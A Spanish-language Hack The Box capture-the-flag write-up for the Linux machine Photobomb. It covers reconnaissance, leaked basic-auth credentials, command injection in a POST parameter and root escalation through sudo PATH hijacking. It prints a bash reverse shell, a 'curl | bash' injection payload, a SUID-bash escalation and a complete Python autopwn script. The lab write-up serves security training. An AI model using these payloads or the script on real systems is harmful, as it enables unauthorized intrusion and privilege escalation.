---
title: "HTB: Resolución de Photobomb"
date: 2023-02-11 06:00:00 +/-TTTT
categories: [HTB, Linux]
tags: [command injection, sudoers, path hijacking]     ## TAG names should always be lowercase
image: photobomb.jpg
img_path: /photos/2023-02-11-Photobomb-WriteUp/
---

***Photobomb*** es una máquina ***Linux*** en la que conseguiremos **ejecución remota de comandos** aprovechándonos de una **inyección de comandos**, acontecida en la página web. Para la escalada, nos aprovecharemos de un privilegio que el usuario *wizard* tiene asignado a nivel de ***sudoers***. En el **Anexo**, inspeccionaremos el **código vulnerable a inyección de comandos** y también mostraré un *script* que automatiza tanto la **intrusión** coma la **escalada** de la máquina.

## Información de la máquina

<table width="100%" cellpadding="2">
    <tr>
        <td>
            <img src="logo.png" alt="drawing" width="465"/>
        </td>
        <td>
            <img src="stats.png" alt="drawing" width="400" />
        </td>
    </tr>
</table>

## Reconocimiento

### ping

Mandamos un _ping_ a la máquina víctima, con la finalidad de conocer su sistema operativo y saber si tenemos conexión con la misma. Un _TTL_ menor o igual a 64 significa que la máquina es _Linux_ y un _TTL_ menor o igual a 128 significa que la máquina es _Windows_.

```bash
$> ping -c 1 10.10.11.182
PING 10.10.11.182 (10.10.11.182) 56(84) bytes of data.
64 bytes from 10.10.11.182: icmp_seq=1 ttl=63 time=106 ms

--- 10.10.11.182 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 105.681/105.681/105.681/0.000 ms
```

Vemos que nos enfrentamos a una máquina **_Linux_**, ya que su *TTL* es 63.

### Port discovery

Procedemos a escanear todo el rango de puertos de la máquina víctima, con la finalidad de encontrar aquellos que estén abiertos (_status open_). Lo hacemos con la herramienta ***nmap***.

```bash
$> sudo nmap -sS --min-rate 5000 -n -Pn -p- -vvv --open 10.10.11.182 -oG allPorts
Nmap scan report for 10.10.11.182
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

**-sS** efectúa un _TCP SYN Scan_, iniciando rápidamente una conexión sin finalizarla.
**-min-rate 5000** sirve para enviar paquetes no más lentos que 5000 paquetes por segundo.
**-n** sirve para evitar resolución DNS.
**-Pn** para evitar host discovery.
**-vvv** triple _verbose_ para que nos vuelque la información que vaya encontrando el escaneo.
**-p-** para escanear todo el rango de puertos.
**-oG** exportará la evidencia en formato _grepeable_ al fichero *allPorts* en este caso.

Hemos encontrado **dos puertos abiertos**, el **22** y el **80**. Un **puerto abierto** está **escuchando solicitudes de conexión entrantes**.

Vamos a lanzar una serie de _scripts_ básicos de enumeración, en busca de los servicios que están corriendo y de sus versiones.

```bash
$> nmap -sCV -p22,80 10.10.11.182 -oN targeted
Nmap scan report for 10.10.11.182
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El puerto **22** es **SSH** y el puerto **80** **HTTP**. De momento, al no disponer de credenciales para autenticarnos por _SSH_, nos centraremos en auditar el puerto **80**.

### Puerto 80 abierto (HTTP)

Gracias a los _scripts_ de reconocimiento que lanza _nmap_, nos damos cuenta de que el servicio web que corre en el puerto **80** nos redirige al dominio ***photobomb.htb***. Para que nuestra máquina pueda resolver a este dominio deberemos añadirlo al final de nuestro _/etc/hosts_, de la forma:  `10.10.11.180 photobomb.htb`

#### Tecnologías utilizadas

En primer lugar, utilizaremos **_whatweb_** para enumerar las tecnologías que corren detrás del servicio web. Nos encontramos con lo siguiente:

```python
$> whatweb 10.10.11.182
http://10.10.11.182 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], RedirectLocation[http://photobomb.htb/], Title[302 Found], nginx[1.18.0]
http://photobomb.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], Script, Title[Photobomb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

La IP nos redirecciona a *photobomb.htb*, como ya sabíamos. La web está usando como servidor web *nginx 1.18.0*.

#### Inspeccionando la web

Al acceder a http://photobomb.htb vemos lo siguiente:

![imagen 1](Pasted image 20230206122215.png)

La web comparte un link que nos lleva a *http://photobomb.htb/printer*, aunque necesitaremos credenciales para poder visualizar el contenido.

Inspeccionando el código fuente (*Ctrl+U*), descubrimos un archivo llamado *photobomb.js*, que se encuentra en http://photobomb.htb/photobomb.js:

![imagen 2](Pasted image 20230206122243.png)

El contenido del archivo es el siguiente:

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

Este script está empleando las credenciales *pH0t0:b0Mb!* para autenticarse contra http://photobomb.htb/printer. Para acceder, podemos, o bien emplear http://pH0t0:b0Mb!@photobomb.htb/printer, o bien, autenticarnos manualmente en */printer*.


Una vez dentro, podremos descargar una imagen, pudiendo seleccionar su resolución y su tipo:

![imagen 3](Pasted image 20230206122419.png)


Interceptaremos la petición por *POST* con *Burpsuite*, para inspeccionar los datos que se tramitan con más detenimiento:

![imagen 4](Pasted image 20230206122959.png)

* *photo* contiene el nombre de la imagen.
* *filetype* contiene la extensión.
* *dimensions* contiene la resolución.

Es posible que el servidor, con esta información, esté aplicando un **comando a nivel de sistema** para obtener la imagen deseada. Si es así, podríamos intentar **inyectar un comando** en alguno de los campos anteriores.

## Consiguiendo shell como wizard

### Command Injection

*Command Injection* es un tipo de vulnerabilidad de seguridad en la que un **atacante** puede **ejecutar comandos arbitrarios** en el sistema operativo de un servidor web o aplicación. Esto sucede cuando **la aplicación no valida correctamente los datos de entrada** antes de utilizarlos en una operación del sistema.

Imaginemos que el servidor, con los datos que se tramitan por POST, está ejecutando un comando del tipo:

```bash
<commando> <dimension> <photo>.<filetype>
```

Podríamos intentar inyectar un *payload* del tipo *dimension=3000x2000; $(whoami)*. El **único** campo inyectable será *filetype* (En el primer punto del **Anexo** inspeccionaremos el **código vulnerable**).

En lugar de *;$(whoami)*, utilizaré *;\$(ping -c 1 10.10.14.58)* para comprobar si tengo conexión con la máquina. Por tanto, la información que se tramitará por POST será la siguiente:

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;$(ping -c 1 10.10.14.58)&dimensions=3000x2000
```

Enviaremos la petición y deberíamos recibir dos trazas ICMP:

```bash
$> sudo tcpdump -n icmp -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:31:59.782634 IP 10.10.11.182 > 10.10.14.58: ICMP echo request, id 6, seq 1, length 64
12:31:59.782651 IP 10.10.14.58 > 10.10.11.182: ICMP echo reply, id 6, seq 1, length 64
```

Para enviarnos una *reverse shell*, en primer lugar, crearé un archivo *index.html* con el siguiente contenido:

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.58/443 0>&1"
```

En segundo lugar, desplegaré un servidor *python* con el comando `python3 -m http.server 80` compartiendo este fichero.  Finalmente, procederé a modificar los datos enviados por *POST* para que el servidor víctima se descargue mi *index.html* y lo interprete con *bash*:

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;$(curl 10.10.14.58 | bash)&dimensions=3000x2000
```

Previamente a enviar la petición, nos pondremos en escucha con *netcat* por el puerto que hayamos elegido. Deberíamos recibir una *shell*:

![imagen 5](Pasted image 20230206123703.png)


Deberíamos hacerle un **tratamiento** a la consola para hacerla más interactiva (ejecutar _Ctrl+C_ sin perder la consola, borrado de los comandos, etc.). Ingresaremos los siguientes comandos:

```bash
import /dev/null -c bash
*Ctrl+Z*
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

También deberíamos ajustar el número de filas y de columnas. Con el comando **_stty size_** podremos consultar las filas y columnas de nuestra consola y con el comando **_stty rows <n.filas\> cols \<n.columnas\>_** podremos ajustar estos campos en la *shell* recibida.

### user.txt

La primera *flag* se encuentra en el *homedir* del usuario *wizard*:

```bash
wizard@photobomb:~$ cat user.txt
4b8fd12b605b9d4ab4173a32bd95f69c
```

## Consiguiendo shell como root

### Reconocimiento del sistema

#### sudoers

Para listar los privilegios de **_sudo_** asignados al usuario *developer*, utilizaremos el comando `sudo -l`:

```bash
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

`SETENV: NOPASSWD: /opt/cleanup.sh` establece una variable de entorno y autoriza al usuario *wizard* a ejecutar el script `/opt/cleanup.sh` como *root* sin tener que ingresar una contraseña.  El uso de `SETENV` permite establecer una **variable de entorno** que persistirá durante toda la sesión de ejecución del comando `sudo`.

El contenido de */opt/cleanup.sh* es el siguiente:

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

## clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

## protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Este *script* realiza las siguientes acciones:

1. Carga las variables de entorno desde el archivo */opt/.bashrc*.
2. Cambia al directorio */home/wizard/photobomb*.
3. Si *log/photobomb.log* existe, copia el contenido del archivo *log/photobomb.log* a un nuevo archivo llamado *log/photobomb.log.old* y luego vacía el archivo *log/photobomb.log*.
4. Utiliza el comando *find* para buscar archivos con la extensión *.jpg* en el directorio *source_images*. Por cada archivo encontrado, cambia el dueño y el grupo del archivo a *root*.

Para el comando *find*, se está utilizando una ruta relativa y no una absoluta. Pudiendo modificar el valor de una variable de entorno durante la ejecución del programa, podríamos llevar a cabo un *path hijacking* y así hacer que el usuario *root* ejecute los comandos que le indiquemos.

### Path hijacking

Cuando introducimos un **comando** **sin especificar la ruta absoluta**, el sistema busca en la variable ***$PATH***, de izquierda a derecha, el directorio donde se encuentra ese binario. Por ejemplo, la ruta absoluta en mi sistema del comando *find* es */usr/bin/find*. El valor de mi *\$PATH*  es:

```bash
$> echo $PATH
/home/r1pfr4n/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/opt/fzf/bin
```

Por lo tanto, al ejecutar *find*, sin especificar la ruta absoluta, el sistema mirará en primer lugar si el binario se encuentra en */home/r1pfr4n/.local/bin*, luego en */snap/bin*… hasta llegar a */usr/bin*.

Vamos a imaginar que **modifico** la variable *$PATH*, para que el primer valor de la misma sea un directorio en el que se encuentra un archivo malicioso llamado *find*. Como el sistema recorre la variable de izquierda a derecha, en vez de hacer *match* con el verdadero *find*, hará *match* con el *find* malicioso.

Vamos a trasladar este concepto a la máquina víctima. En el directorio */tmp*, crearemos un fichero llamado *find* con el siguiente contenido:

```bash
chmod u+s /bin/bash
```

Al ser ejecutado por *root*, el comando anterior otorgará permisos *SUID* a la *bash*, pudiendo así obtener una *shell* como *root*.

Seguidamente, **modificaremos** el valor de la variable de entorno ***PATH***:

```bash
wizard@photobomb:/tmp$ export PATH=/tmp:$PATH
wizard@photobomb:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Finalmente, ejecutaremos */opt/cleanup.sh* de la siguiente manera:

```bash
sudo PATH=$PATH /opt/cleanup.sh
```

*root*, al ejecutar *find*, hará match con */tmp/find* y ejecutará nuestro comando malicioso en vez del verdadero *find*.

Se le debería atribuir a la bash permisos *SUID*:

```bash
wizard@photobomb:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Nos *spawneamos* una shell como *root* con el comando `bash -p`:

```bash
wizard@photobomb:/tmp$ bash -p
bash-5.0## whoami
root
```

### root.txt

La última *flag* se encuentra en el *homedir* de *root*:

```bash
bash-5.0## cd /root/
bash-5.0## cat root.txt
c1526a773f48d893614094895204b186
```

## Anexo

### Inspección de código vulnerable a inyección de comandos

Este es el código que se encarga de recibir los datos que tramitamos por POST al descargar una imagen. Lo encontraremos en el directorio *~/photobomb/server.rb*:

```ruby
## server.rb

post '/printer' do
  photo = params[:photo]
  filetype = params[:filetype]
  dimensions = params[:dimensions]

  ## handle inputs
  if photo.match(/\.{2}|\//)
    halt 500, 'Invalid photo.'
  end

  if !FileTest.exist?( "source_images/" + photo )
    halt 500, 'Source photo does not exist.'
  end

  if !filetype.match(/^(png|jpg)/)
    halt 500, 'Invalid filetype.'
  end

  if !dimensions.match(/^[0-9]+x[0-9]+$/)
    halt 500, 'Invalid dimensions.'
  end

  case filetype
  when 'png'
    content_type 'image/png'
  when 'jpg'
    content_type 'image/jpeg'
  end

  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
  response['Content-Disposition'] = "attachment; filename=#{filename}"

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
  else
    puts "File already exists."
  end

  if File.exists?('resized_images/' + filename)
    halt 200, {}, IO.read('resized_images/' + filename)
  end

  #message = 'Failed to generate a copy of ' + photo + ' resized to ' + dimensions + ' with filetype ' + filetype
  message = 'Failed to generate a copy of ' + photo
  halt 500, message
end
```

En este código, hay varias validaciones que se realizan para asegurarse de que los parámetros proporcionados sean válidos:

1. Validación de **photo**: se verifica si la cadena contiene *..* o */* con una expresión regular. Esto se hace para **evitar inyecciones de ruta maliciosas** y para asegurarse de que la imagen se encuentra dentro del directorio permitido.
2. Validación de **existencia de archivo**: se comprueba si el archivo de origen existe en el directorio *source_images*.
3. Validación de **tipo de archivo**: se comprueba si el tipo de archivo **empieza** por *png* o *jpg* mediante una expresión regular.
4. Validación de **dimensiones**: se comprueba si las dimensiones tienen un **formato válido** con una expresión regular (**deben ser números seguidos de "x" seguidos de otros números**).

Si alguna de estas validaciones falla, se detiene la ejecución y se devuelve un código *HTTP 500.* De lo contrario, se procesa la imagen y se devuelve el archivo redimensionado con un código *HTTP 200*.

* En el parámetro *photo* no se puede dar una ejecución de comandos, ya que el nombre de la imagen debe de existir en *source_images/*.
* En el parámetro *dimensions*, tampoco se puede inyectar comandos, puesto que el contenido de la variable deben ser números separados por una *x*.
* En el parámetro *filetype*, en cambio, se verifica si el contenido empieza por *jpg* o *png*, pero no si acaba por uno de estos valores, pudiendo inyectar un comando de la forma `png o jpg; $(whoami)`.

### Script autopwn

El siguiente *script* automatiza tanto la intrusión como la escalada de la máquina. Para ejecutarlo, simplemente `python3 exploit.py <IP_tun0> <puerto>`:

```python
#!/usr/bin/python3

import signal,sys,requests,threading,time,http.server,socketserver,os
from pwn import *

## Variables globales
lhost=''
lport = ''

## Ctrl + C
def def_handler(sig,frame):
	print("[!] Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def runHTTPServer():
    PORT = 8081
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", PORT), Handler)
    httpd.serve_forever()

def indexcreate():
    f = open("index.html", "w")
    f.write(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
    f.close()

def makeRequest():

	url = "http://photobomb.htb/printer"

	post_data = {
		"photo":"voicu-apostol-MWER49YaD-M-unsplash.jpg",
		"filetype":f"jpg;$(curl {lhost}:8081 | bash)",
		"dimensions":"3000x2000"
	}

	headers = {
		"Authorization": "Basic cEgwdDA6YjBNYiE="

	}

	requests.post(url, headers=headers, data=post_data)

if __name__ == '__main__':

	if len(sys.argv) < 3:
		print ("\nIntroduce tu IP local y puerto")

	else:
		lhost= sys.argv[1]
		lport = sys.argv[2]
		p1 = log.progress("Photobomb autopwn to root user")
		p1.status("Obteniendo shell como wizard")
		time.sleep(2)

		indexcreate()

		try:
			threading.Thread(target=runHTTPServer, args=()).start()

			try:
				threading.Thread(target=makeRequest, args=()).start()
			except Exception as e:
				log.error(str(e))

			shell = listen(lport, timeout=20).wait_for_connection()

			if shell.sock is None:
				p1.failure("Conexión fallida")
				sys.exit(1)

			else:
				p1.status("Shell obtenido como wizard")
				os.remove("index.html")
				sleep(2)
				p1.status("Pivotando a root")
				sleep(2)
				shell.sendline(b"echo 'chmod u+s /bin/bash' > /tmp/find")
				shell.sendline(b"chmod +x /tmp/find")
				shell.sendline(b"export PATH=/tmp:$PATH")
				shell.sendline(b"sudo PATH=$PATH /opt/cleanup.sh")
				shell.sendline(b"bash -p")
				sleep(2)
				shell.interactive()

		except Exception as e:
			log.error(str(e))
```


